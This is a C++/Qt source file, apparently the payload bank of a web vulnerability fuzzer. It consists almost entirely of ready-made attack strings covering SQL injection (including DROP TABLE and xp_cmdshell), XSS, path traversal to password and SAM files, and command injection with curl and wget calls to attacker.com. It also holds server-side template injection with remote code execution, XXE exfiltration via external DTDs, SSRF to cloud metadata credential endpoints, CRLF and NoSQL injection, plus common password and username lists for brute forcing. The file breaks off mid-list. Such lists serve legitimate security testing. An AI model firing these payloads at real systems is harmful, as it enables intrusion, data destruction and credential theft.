#include "fuzzengine.h"
#include <QRandomGenerator>
#include <QUrl>

QStringList FuzzEngine::getSqlInjectionPayloads() {
    return {
        QStringLiteral("'"),
        QStringLiteral("\""),
        QStringLiteral("' OR '1'='1"),
        QStringLiteral("\" OR \"1\"=\"1"),
        QStringLiteral("' OR '1'='1'--"),
        QStringLiteral("\" OR \"1\"=\"1\"--"),
        QStringLiteral("' OR '1'='1'/*"),
        QStringLiteral("\" OR \"1\"=\"1\"/*"),
        QStringLiteral("1' OR '1'='1"),
        QStringLiteral("1\" OR \"1\"=\"1"),
        QStringLiteral("' OR 1=1--"),
        QStringLiteral("\" OR 1=1--"),
        QStringLiteral("' OR 1=1#"),
        QStringLiteral("\" OR 1=1#"),
        QStringLiteral("admin'--"),
        QStringLiteral("admin\"--"),
        QStringLiteral("admin' #"),
        QStringLiteral("admin\" #"),
        QStringLiteral("') OR ('1'='1"),
        QStringLiteral("\") OR (\"1\"=\"1"),
        QStringLiteral("' UNION SELECT NULL--"),
        QStringLiteral("' UNION SELECT NULL,NULL--"),
        QStringLiteral("' UNION SELECT NULL,NULL,NULL--"),
        QStringLiteral("1 UNION SELECT 1,2,3--"),
        QStringLiteral("1' UNION SELECT 1,2,3--"),
        QStringLiteral("-1 UNION SELECT 1,2,3--"),
        QStringLiteral("-1' UNION SELECT 1,2,3--"),
        QStringLiteral("' UNION ALL SELECT 1,2,3--"),
        QStringLiteral("' UNION ALL SELECT NULL,NULL,NULL--"),
        QStringLiteral("1; DROP TABLE users--"),
        QStringLiteral("1'; DROP TABLE users--"),
        QStringLiteral("'; EXEC xp_cmdshell('dir')--"),
        QStringLiteral("1; EXEC xp_cmdshell('whoami')--"),
        QStringLiteral("'; WAITFOR DELAY '0:0:5'--"),
        QStringLiteral("1; WAITFOR DELAY '0:0:5'--"),
        QStringLiteral("' AND 1=1--"),
        QStringLiteral("' AND 1=2--"),
        QStringLiteral("' AND 'a'='a"),
        QStringLiteral("' AND 'a'='b"),
        QStringLiteral("1 AND 1=1"),
        QStringLiteral("1 AND 1=2"),
        QStringLiteral("' ORDER BY 1--"),
        QStringLiteral("' ORDER BY 10--"),
        QStringLiteral("' ORDER BY 100--"),
        QStringLiteral("' GROUP BY 1--"),
        QStringLiteral("' HAVING 1=1--"),
        QStringLiteral("1' AND SLEEP(5)--"),
        QStringLiteral("1' AND BENCHMARK(10000000,SHA1('test'))--"),
        QStringLiteral("' OR SLEEP(5)--"),
        QStringLiteral("1; SELECT pg_sleep(5)--"),
        QStringLiteral("'; SELECT pg_sleep(5)--"),
        QStringLiteral("||pg_sleep(5)--"),
        QStringLiteral("' OR pg_sleep(5)--"),
        QStringLiteral("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
        QStringLiteral("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
        QStringLiteral("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--"),
        QStringLiteral("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--"),
        QStringLiteral("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--"),
        QStringLiteral("1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--"),
        QStringLiteral("%27"),
        QStringLiteral("%22"),
        QStringLiteral("%27%20OR%20%271%27%3D%271"),
        QStringLiteral("%27%20UNION%20SELECT%20NULL--"),
        QStringLiteral("1%27%20OR%20%271%27%3D%271"),
        QStringLiteral("\\x27"),
        QStringLiteral("\\x22"),
        QStringLiteral("\\u0027"),
        QStringLiteral("\\u0022"),
        QStringLiteral("' OR ''='"),
        QStringLiteral("\" OR \"\"=\""),
        QStringLiteral("' OR '"),
        QStringLiteral("\" OR \""),
    };
}

QStringList FuzzEngine::getXssPayloads() {
    return {
        QStringLiteral("<script>alert(1)</script>"),
        QStringLiteral("<script>alert('XSS')</script>"),
        QStringLiteral("<script>alert(document.cookie)</script>"),
        QStringLiteral("<script>alert(document.domain)</script>"),
        QStringLiteral("<img src=x onerror=alert(1)>"),
        QStringLiteral("<img src=x onerror=alert('XSS')>"),
        QStringLiteral("<img src=\"x\" onerror=\"alert(1)\">"),
        QStringLiteral("<svg onload=alert(1)>"),
        QStringLiteral("<svg/onload=alert(1)>"),
        QStringLiteral("<body onload=alert(1)>"),
        QStringLiteral("<input onfocus=alert(1) autofocus>"),
        QStringLiteral("<input onblur=alert(1) autofocus><input autofocus>"),
        QStringLiteral("<marquee onstart=alert(1)>"),
        QStringLiteral("<video><source onerror=alert(1)>"),
        QStringLiteral("<audio src=x onerror=alert(1)>"),
        QStringLiteral("<details open ontoggle=alert(1)>"),
        QStringLiteral("<iframe src=\"javascript:alert(1)\">"),
        QStringLiteral("<iframe srcdoc=\"<script>alert(1)</script>\">"),
        QStringLiteral("<object data=\"javascript:alert(1)\">"),
        QStringLiteral("<embed src=\"javascript:alert(1)\">"),
        QStringLiteral("<a href=\"javascript:alert(1)\">click</a>"),
        QStringLiteral("<a href=\"javascript:alert(document.cookie)\">click</a>"),
        QStringLiteral("javascript:alert(1)"),
        QStringLiteral("javascript:alert('XSS')"),
        QStringLiteral("javascript:alert(document.domain)"),
        QStringLiteral("<div onmouseover=alert(1)>hover</div>"),
        QStringLiteral("<div onmousemove=alert(1)>move</div>"),
        QStringLiteral("<form><button formaction=javascript:alert(1)>click</button>"),
        QStringLiteral("<isindex action=javascript:alert(1) type=submit>"),
        QStringLiteral("<xss onclick=\"alert(1)\">click</xss>"),
        QStringLiteral("<x onclick=alert(1)>click</x>"),
        QStringLiteral("'-alert(1)-'"),
        QStringLiteral("\"-alert(1)-\""),
        QStringLiteral("</script><script>alert(1)</script>"),
        QStringLiteral("</title><script>alert(1)</script>"),
        QStringLiteral("</textarea><script>alert(1)</script>"),
        QStringLiteral("</style><script>alert(1)</script>"),
        QStringLiteral("</noscript><script>alert(1)</script>"),
        QStringLiteral("--><script>alert(1)</script>"),
        QStringLiteral("]]><script>alert(1)</script>"),
        QStringLiteral("<ScRiPt>alert(1)</ScRiPt>"),
        QStringLiteral("<scr<script>ipt>alert(1)</scr</script>ipt>"),
        QStringLiteral("<script/src=data:,alert(1)>"),
        QStringLiteral("<script>\\u0061lert(1)</script>"),
        QStringLiteral("<script>\\x61lert(1)</script>"),
        QStringLiteral("<script>eval('ale'+'rt(1)')</script>"),
        QStringLiteral("<script>eval(atob('YWxlcnQoMSk='))</script>"),
        QStringLiteral("<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"),
        QStringLiteral("<svg><script>alert(1)</script>"),
        QStringLiteral("<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click"),
        QStringLiteral("%3Cscript%3Ealert(1)%3C/script%3E"),
        QStringLiteral("%3Cimg%20src=x%20onerror=alert(1)%3E"),
        QStringLiteral("&lt;script&gt;alert(1)&lt;/script&gt;"),
        QStringLiteral("\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"),
        QStringLiteral("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
        QStringLiteral("<img src=1 onerror=alert`1`>"),
        QStringLiteral("<script>alert`1`</script>"),
        QStringLiteral("<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">"),
        QStringLiteral("<img src=x onerror=prompt(1)>"),
        QStringLiteral("<img src=x onerror=confirm(1)>"),
        QStringLiteral("<img src=x onerror=print()>"),
    };
}

QStringList FuzzEngine::getPathTraversalPayloads() {
    return {
        QStringLiteral("../"),
        QStringLiteral("..\\"),
        QStringLiteral("../.."),
        QStringLiteral("..\\.."),
        QStringLiteral("../../"),
        QStringLiteral("..\\..\\"),
        QStringLiteral("../../../"),
        QStringLiteral("..\\..\\..\\"),
        QStringLiteral("../../../../"),
        QStringLiteral("..\\..\\..\\..\\"),
        QStringLiteral("../../../../../"),
        QStringLiteral("..\\..\\..\\..\\..\\"),
        QStringLiteral("../../../../../../"),
        QStringLiteral("..\\..\\..\\..\\..\\..\\"),
        QStringLiteral("../../../../../../../"),
        QStringLiteral("../../../../../../../../"),
        QStringLiteral("../../../../../../../etc/passwd"),
        QStringLiteral("../../../../../../../etc/shadow"),
        QStringLiteral("../../../../../../../etc/hosts"),
        QStringLiteral("../../../../../../../etc/group"),
        QStringLiteral("../../../../../../../etc/motd"),
        QStringLiteral("../../../../../../../etc/issue"),
        QStringLiteral("../../../../../../../proc/self/environ"),
        QStringLiteral("../../../../../../../proc/self/cmdline"),
        QStringLiteral("../../../../../../../proc/self/fd/0"),
        QStringLiteral("../../../../../../../var/log/apache/access.log"),
        QStringLiteral("../../../../../../../var/log/apache2/access.log"),
        QStringLiteral("../../../../../../../var/log/nginx/access.log"),
        QStringLiteral("../../../../../../../var/log/httpd/access_log"),
        QStringLiteral("..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam"),
        QStringLiteral("..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        QStringLiteral("..\\..\\..\\..\\..\\..\\boot.ini"),
        QStringLiteral("..\\..\\..\\..\\..\\..\\windows\\system.ini"),
        QStringLiteral("....//"),
        QStringLiteral("....\\\\"),
        QStringLiteral("....//....//"),
        QStringLiteral("....\\\\....\\\\"),
        QStringLiteral("..../"),
        QStringLiteral("....\\"),
        QStringLiteral("%2e%2e%2f"),
        QStringLiteral("%2e%2e/"),
        QStringLiteral("..%2f"),
        QStringLiteral("%2e%2e\\"),
        QStringLiteral("..%5c"),
        QStringLiteral("%2e%2e%5c"),
        QStringLiteral("%252e%252e%252f"),
        QStringLiteral("%252e%252e%255c"),
        QStringLiteral("..%252f"),
        QStringLiteral("..%255c"),
        QStringLiteral("..%c0%af"),
        QStringLiteral("..%c1%9c"),
        QStringLiteral("..%c0%ae"),
        QStringLiteral("%c0%ae%c0%ae%c0%af"),
        QStringLiteral("%c0%ae%c0%ae%c1%9c"),
        QStringLiteral("..\\../"),
        QStringLiteral("../..\\"),
        QStringLiteral(".../...//"),
        QStringLiteral("\\..\\..\\"),
        QStringLiteral("/..\\../"),
        QStringLiteral("file:///etc/passwd"),
        QStringLiteral("file://c:/windows/win.ini"),
        QStringLiteral("/etc/passwd%00.jpg"),
        QStringLiteral("../../../etc/passwd%00.png"),
        QStringLiteral("....//....//etc/passwd"),
        QStringLiteral("..0x2f..0x2fetc/passwd"),
        QStringLiteral("..;/..;/etc/passwd"),
        QStringLiteral("..%00/..%00/etc/passwd"),
    };
}

QStringList FuzzEngine::getCommandInjectionPayloads() {
    return {
        QStringLiteral("; id"),
        QStringLiteral("| id"),
        QStringLiteral("|| id"),
        QStringLiteral("& id"),
        QStringLiteral("&& id"),
        QStringLiteral("`id`"),
        QStringLiteral("$(id)"),
        QStringLiteral("; ls -la"),
        QStringLiteral("| ls -la"),
        QStringLiteral("; cat /etc/passwd"),
        QStringLiteral("| cat /etc/passwd"),
        QStringLiteral("; whoami"),
        QStringLiteral("| whoami"),
        QStringLiteral("& whoami"),
        QStringLiteral("`whoami`"),
        QStringLiteral("$(whoami)"),
        QStringLiteral("; uname -a"),
        QStringLiteral("| uname -a"),
        QStringLiteral("; ping -c 1 127.0.0.1"),
        QStringLiteral("| ping -c 1 127.0.0.1"),
        QStringLiteral("; sleep 5"),
        QStringLiteral("| sleep 5"),
        QStringLiteral("& sleep 5"),
        QStringLiteral("`sleep 5`"),
        QStringLiteral("$(sleep 5)"),
        QStringLiteral("& ping -n 5 127.0.0.1 &"),
        QStringLiteral("| ping -n 5 127.0.0.1"),
        QStringLiteral("; dir"),
        QStringLiteral("| dir"),
        QStringLiteral("& dir"),
        QStringLiteral("; type c:\\windows\\win.ini"),
        QStringLiteral("| type c:\\windows\\win.ini"),
        QStringLiteral("; curl http://attacker.com"),
        QStringLiteral("| curl http://attacker.com"),
        QStringLiteral("; wget http://attacker.com"),
        QStringLiteral("| wget http://attacker.com"),
        QStringLiteral(";${IFS}id"),
        QStringLiteral("|${IFS}id"),
        QStringLiteral("$IFS;id"),
        QStringLiteral("{id}"),
        QStringLiteral("${id}"),
        QStringLiteral(";echo${IFS}test"),
        QStringLiteral("|echo${IFS}test"),
        QStringLiteral("'id'"),
        QStringLiteral("';id;'"),
        QStringLiteral("\";id;\""),
        QStringLiteral("a]id[a"),
        QStringLiteral("a]|id|[a"),
        QStringLiteral(";echo$(id)"),
        QStringLiteral("|echo$(id)"),
        QStringLiteral(";{id,}"),
        QStringLiteral("|{id,}"),
        QStringLiteral("id\n"),
        QStringLiteral("id\\n"),
        QStringLiteral("id%0a"),
        QStringLiteral("id%0A"),
        QStringLiteral("id%0d%0a"),
        QStringLiteral("id\\r\\n"),
        QStringLiteral("\nid"),
        QStringLiteral("\\nid"),
        QStringLiteral("%0aid"),
        QStringLiteral("%0did"),
        QStringLiteral("%0a%0did"),
    };
}

QStringList FuzzEngine::getLdapInjectionPayloads() {
    return {
        QStringLiteral("*"),
        QStringLiteral("*)(&"),
        QStringLiteral("*)(|"),
        QStringLiteral("*)(objectClass=*"),
        QStringLiteral("*)(uid=*))(|(uid=*"),
        QStringLiteral("admin*"),
        QStringLiteral("admin*)(uid=*))(|(uid=*"),
        QStringLiteral("*)(cn=*"),
        QStringLiteral("*)(|(cn=*"),
        QStringLiteral("*)(objectClass=user"),
        QStringLiteral("*)(objectClass=person"),
        QStringLiteral(")(cn=*)(|(cn="),
        QStringLiteral(")(uid=*)(|(uid="),
        QStringLiteral("*))%00"),
        QStringLiteral("*()|"),
        QStringLiteral("*)(uid=*))"),
        QStringLiteral("admin*)((|userPassword=*"),
        QStringLiteral("*)(userPassword=*"),
        QStringLiteral("*(|(mail=*))"),
        QStringLiteral("*(|(password=*))"),
        QStringLiteral("*)(|(objectclass=*"),
        QStringLiteral("x]*))(|(x=*"),
        QStringLiteral("*)(uid=*)(|(uid=*"),
        QStringLiteral("*(cn=*)(|(cn=*"),
        QStringLiteral("*)(&(uid=*"),
    };
}

QStringList FuzzEngine::getXpathInjectionPayloads() {
    return {
        QStringLiteral("'"),
        QStringLiteral("\""),
        QStringLiteral("' or '1'='1"),
        QStringLiteral("\" or \"1\"=\"1"),
        QStringLiteral("' or ''='"),
        QStringLiteral("\" or \"\"=\""),
        QStringLiteral("1' or '1'='1"),
        QStringLiteral("1\" or \"1\"=\"1"),
        QStringLiteral("' or 1=1 or '"),
        QStringLiteral("\" or 1=1 or \""),
        QStringLiteral("' or 'a'='a"),
        QStringLiteral("\" or \"a\"=\"a"),
        QStringLiteral("'] | //* | //x['"),
        QStringLiteral("\"] | //* | //x[\""),
        QStringLiteral("') or ('a'='a"),
        QStringLiteral("\") or (\"a\"=\"a"),
        QStringLiteral("' and count(/*)=1 and '1'='1"),
        QStringLiteral("' and string-length(name(/*[1]))=1 and '1'='1"),
        QStringLiteral("' and substring(name(/*[1]),1,1)='a' and '1'='1"),
        QStringLiteral("x]|//.|//x["),
        QStringLiteral("' or count(//*)>0 or '"),
        QStringLiteral("' or count(/*)>0 and '1'='1"),
        QStringLiteral("1 or 1=1"),
        QStringLiteral("1 and 1=1"),
        QStringLiteral("1' and '1'='1"),
    };
}

QStringList FuzzEngine::getSstiPayloads() {
    return {
        QStringLiteral("{{7*7}}"),
        QStringLiteral("${7*7}"),
        QStringLiteral("<%= 7*7 %>"),
        QStringLiteral("#{7*7}"),
        QStringLiteral("{{config}}"),
        QStringLiteral("{{config.items()}}"),
        QStringLiteral("{{settings.SECRET_KEY}}"),
        QStringLiteral("{{request}}"),
        QStringLiteral("{{request.application.__globals__}}"),
        QStringLiteral("{{''.__class__.__mro__[2].__subclasses__()}}"),
        QStringLiteral("{{''.__class__.__base__.__subclasses__()}}"),
        QStringLiteral("{{[].__class__.__base__.__subclasses__()}}"),
        QStringLiteral("${{7*7}}"),
        QStringLiteral("*{7*7}"),
        QStringLiteral("@(7*7)"),
        QStringLiteral("{{constructor.constructor('return this')()}}"),
        QStringLiteral("{{this.constructor.constructor('return process')()}}"),
        QStringLiteral("{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"),
        QStringLiteral("<%=7*7%>"),
        QStringLiteral("<%=`id`%>"),
        QStringLiteral("${T(java.lang.Runtime).getRuntime().exec('id')}"),
        QStringLiteral("${T(java.lang.System).getenv()}"),
        QStringLiteral("{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"),
        QStringLiteral("{{['id']|filter('system')}}"),
        QStringLiteral("{{['cat /etc/passwd']|filter('system')}}"),
        QStringLiteral("{{app.request.server.all|join(',')}}"),
        QStringLiteral("{{dump(app)}}"),
        QStringLiteral("{{request.application.__class__.__dict__}}"),
        QStringLiteral("{{cycler.__init__.__globals__.os.popen('id').read()}}"),
        QStringLiteral("{{joiner.__init__.__globals__.os.popen('id').read()}}"),
    };
}

QStringList FuzzEngine::getXxePayloads() {
    return {
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"https://attacker.com/xxe\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ftp://attacker.com/xxe\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"gopher://attacker.com/xxe\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>&exfil;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;%payload;]><data>&send;</data>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>"),
    };
}

QStringList FuzzEngine::getCsrfPayloads() {
    return {
        QStringLiteral("<form action=\"TARGET_URL\" method=\"POST\"><input type=\"hidden\" name=\"param\" value=\"value\"/><input type=\"submit\" value=\"Submit\"/></form>"),
        QStringLiteral("<img src=\"TARGET_URL?action=delete&id=1\"/>"),
        QStringLiteral("<script>new Image().src='TARGET_URL?action=delete&id=1';</script>"),
        QStringLiteral("<iframe src=\"TARGET_URL\" style=\"display:none\"></iframe>"),
        QStringLiteral("<body onload=\"document.forms[0].submit()\"><form action=\"TARGET_URL\" method=\"POST\"><input type=\"hidden\" name=\"param\" value=\"value\"/></form></body>"),
        QStringLiteral("<script>var xhr=new XMLHttpRequest();xhr.open('POST','TARGET_URL',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('param=value');</script>"),
    };
}

QStringList FuzzEngine::getOpenRedirectPayloads() {
    return {
        QStringLiteral("//evil.com"),
        QStringLiteral("//evil.com/"),
        QStringLiteral("///evil.com"),
        QStringLiteral("////evil.com"),
        QStringLiteral("https://evil.com"),
        QStringLiteral("http://evil.com"),
        QStringLiteral("//evil.com/%2f.."),
        QStringLiteral("//evil%E3%80%82com"),
        QStringLiteral("//evil。com"),
        QStringLiteral("/\\evil.com"),
        QStringLiteral("\\\\evil.com"),
        QStringLiteral("/%5cevil.com"),
        QStringLiteral("/%09/evil.com"),
        QStringLiteral("/%2f%2fevil.com"),
        QStringLiteral("//%0d%0aevil.com"),
        QStringLiteral("//evil.com\\@good.com"),
        QStringLiteral("//evil.com%00@good.com"),
        QStringLiteral("//good.com.evil.com"),
        QStringLiteral("http://good.com@evil.com"),
        QStringLiteral("http://good.com#@evil.com"),
        QStringLiteral("http://good.com?@evil.com"),
        QStringLiteral("javascript:alert(document.domain)"),
        QStringLiteral("javascript://evil.com%0aalert(1)"),
        QStringLiteral("data:text/html,<script>alert(1)</script>"),
        QStringLiteral("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
    };
}

QStringList FuzzEngine::getHostHeaderPayloads() {
    return {
        QStringLiteral("evil.com"),
        QStringLiteral("evil.com:80"),
        QStringLiteral("evil.com:443"),
        QStringLiteral("localhost"),
        QStringLiteral("127.0.0.1"),
        QStringLiteral("0.0.0.0"),
        QStringLiteral("evil.com:@legit.com"),
        QStringLiteral("legit.com:evil.com"),
        QStringLiteral("legit.com@evil.com"),
        QStringLiteral("legit.com#evil.com"),
        QStringLiteral("legit.com%evil.com"),
        QStringLiteral("legit.com\\evil.com"),
        QStringLiteral("evil.com/legit.com"),
        QStringLiteral("evil.com?.legit.com"),
        QStringLiteral("evil.com#.legit.com"),
        QStringLiteral("evil.com\\.legit.com"),
    };
}

QStringList FuzzEngine::getCrlfjectionPayloads() {
    return {
        QStringLiteral("%0d%0aSet-Cookie:crlf=injection"),
        QStringLiteral("%0d%0aLocation:http://evil.com"),
        QStringLiteral("%0d%0a%0d%0a<script>alert(1)</script>"),
        QStringLiteral("\\r\\nSet-Cookie:crlf=injection"),
        QStringLiteral("\\r\\nLocation:http://evil.com"),
        QStringLiteral("%E5%98%8D%E5%98%8ASet-Cookie:crlf=injection"),
        QStringLiteral("%E5%98%8D%E5%98%8ALocation:http://evil.com"),
        QStringLiteral("%0aSet-Cookie:crlf=injection"),
        QStringLiteral("%0dSet-Cookie:crlf=injection"),
        QStringLiteral("%0d%20%0a%20Set-Cookie:crlf=injection"),
        QStringLiteral("%23%0d%0aSet-Cookie:crlf=injection"),
        QStringLiteral("%3f%0d%0aSet-Cookie:crlf=injection"),
    };
}

QStringList FuzzEngine::getNoSqlInjectionPayloads() {
    return {
        QStringLiteral("{\"$gt\": \"\"}"),
        QStringLiteral("{\"$ne\": \"\"}"),
        QStringLiteral("{\"$ne\": 1}"),
        QStringLiteral("{\"$gt\": 0}"),
        QStringLiteral("{\"$where\": \"1==1\"}"),
        QStringLiteral("{\"$where\": \"this.password.length > 0\"}"),
        QStringLiteral("{\"$regex\": \".*\"}"),
        QStringLiteral("{\"$regex\": \"^a\"}"),
        QStringLiteral("{\"$or\": [{},{}]}"),
        QStringLiteral("{\"$and\": [{},{}]}"),
        QStringLiteral("[$ne]=1"),
        QStringLiteral("[$gt]="),
        QStringLiteral("[$regex]=.*"),
        QStringLiteral("[$where]=1"),
        QStringLiteral("[$or][0]={}"),
        QStringLiteral("true, $where: '1 == 1'"),
        QStringLiteral(", $where: '1 == 1'"),
        QStringLiteral("'; return '' == '"),
        QStringLiteral("'; return this.password.match(/.*/)//+%00"),
        QStringLiteral("'; return db.users.findOne()//+%00"),
    };
}

QStringList FuzzEngine::getSsrfPayloads() {
    return {
        QStringLiteral("http://127.0.0.1"),
        QStringLiteral("http://localhost"),
        QStringLiteral("http://[::1]"),
        QStringLiteral("http://0.0.0.0"),
        QStringLiteral("http://127.0.0.1:22"),
        QStringLiteral("http://127.0.0.1:3306"),
        QStringLiteral("http://127.0.0.1:6379"),
        QStringLiteral("http://127.0.0.1:11211"),
        QStringLiteral("http://169.254.169.254"),
        QStringLiteral("http://169.254.169.254/latest/meta-data/"),
        QStringLiteral("http://169.254.169.254/latest/user-data/"),
        QStringLiteral("http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        QStringLiteral("http://metadata.google.internal/computeMetadata/v1/"),
        QStringLiteral("http://169.254.170.2/v1/credentials"),
        QStringLiteral("http://192.168.1.1"),
        QStringLiteral("http://10.0.0.1"),
        QStringLiteral("http://172.16.0.1"),
        QStringLiteral("file:///etc/passwd"),
        QStringLiteral("file:///etc/shadow"),
        QStringLiteral("file:///c:/windows/win.ini"),
        QStringLiteral("gopher://127.0.0.1:6379/_"),
        QStringLiteral("dict://127.0.0.1:6379/info"),
        QStringLiteral("ftp://127.0.0.1"),
        QStringLiteral("sftp://127.0.0.1"),
        QStringLiteral("tftp://127.0.0.1"),
        QStringLiteral("http://0x7f.0x0.0x0.0x1"),
        QStringLiteral("http://0177.0.0.1"),
        QStringLiteral("http://2130706433"),
        QStringLiteral("http://0x7f000001"),
        QStringLiteral("http://127.1"),
        QStringLiteral("http://127.0.1"),
    };
}

QStringList FuzzEngine::getUserAgents() {
    return {
        QStringLiteral("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        QStringLiteral("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"),
        QStringLiteral("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        QStringLiteral("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"),
        QStringLiteral("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
        QStringLiteral("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"),
        QStringLiteral("Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"),
        QStringLiteral("Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"),
        QStringLiteral("Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"),
        QStringLiteral("Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"),
        QStringLiteral("Googlebot/2.1 (+http://www.google.com/bot.html)"),
        QStringLiteral("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
        QStringLiteral("Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"),
        QStringLiteral("Baiduspider+(+http://www.baidu.com/search/spider.htm)"),
        QStringLiteral("curl/7.88.1"),
        QStringLiteral("Wget/1.21.3"),
        QStringLiteral("python-requests/2.31.0"),
        QStringLiteral("Apache-HttpClient/4.5.14 (Java/17.0.9)"),
        QStringLiteral("sqlmap/1.7.12 (https://sqlmap.org)"),
        QStringLiteral("Nikto/2.5.0"),
    };
}

QStringList FuzzEngine::getCommonPasswords() {
    return {
        QStringLiteral("password"), QStringLiteral("123456"), QStringLiteral("12345678"),
        QStringLiteral("qwerty"), QStringLiteral("abc123"), QStringLiteral("monkey"),
        QStringLiteral("1234567"), QStringLiteral("letmein"), QStringLiteral("trustno1"),
        QStringLiteral("dragon"), QStringLiteral("baseball"), QStringLiteral("iloveyou"),
        QStringLiteral("master"), QStringLiteral("sunshine"), QStringLiteral("ashley"),
        QStringLiteral("bailey"), QStringLiteral("passw0rd"), QStringLiteral("shadow"),
        QStringLiteral("123123"), QStringLiteral("654321"), QStringLiteral("superman"),
        QStringLiteral("qazwsx"), QStringLiteral("michael"), QStringLiteral("football"),
        QStringLiteral("password1"), QStringLiteral("password123"), QStringLiteral("batman"),
        QStringLiteral("login"), QStringLiteral("admin"), QStringLiteral("admin123"),
        QStringLiteral("root"), QStringLiteral("toor"), QStringLiteral("pass"),
        QStringLiteral("test"), QStringLiteral("guest"), QStringLiteral("master"),
        QStringLiteral("changeme"), QStringLiteral("P@ssw0rd"), QStringLiteral("Password1"),
        QStringLiteral("Welcome1"), QStringLiteral("Welcome123"), QStringLiteral("Winter2023"),
        QStringLiteral("Summer2023"), QStringLiteral("Spring2023"), QStringLiteral("Fall2023"),
        QStringLiteral("Company123"), QStringLiteral("Passw0rd!"), QStringLiteral("Password!"),
    };
}

QStringList FuzzEngine::getCommonUsernames() {
    return {
        QStringLiteral("admin"), QStringLiteral("administrator"), QStringLiteral("root"),
        QStringLiteral("user"), QStringLiteral("test"), QStringLiteral("guest"),
        QStringLiteral("info"), QStringLiteral("adm"), QStringLiteral("mysql"),
        QStringLiteral("postgres"), QStringLiteral("oracle"), QStringLiteral("ftp"),
        QStringLiteral("www"), QStringLiteral("web"), QStringLiteral("www-data"),
        QStringLiteral("anonymous"), QStringLiteral("default"), QStringLiteral("backup"),
        QStringLiteral("tomcat"), QStringLiteral("webmaster"), QStringLiteral("support"),
        QStringLiteral("demo"), QStringLiteral("manager"), QStringLiteral("operator"),
        QStringLiteral("system"), QStringLiteral("sysadmin"), QStringLiteral("superuser"),
        QStringLiteral("sa"), QStringLiteral("dba"), QStringLiteral("dbadmin"),
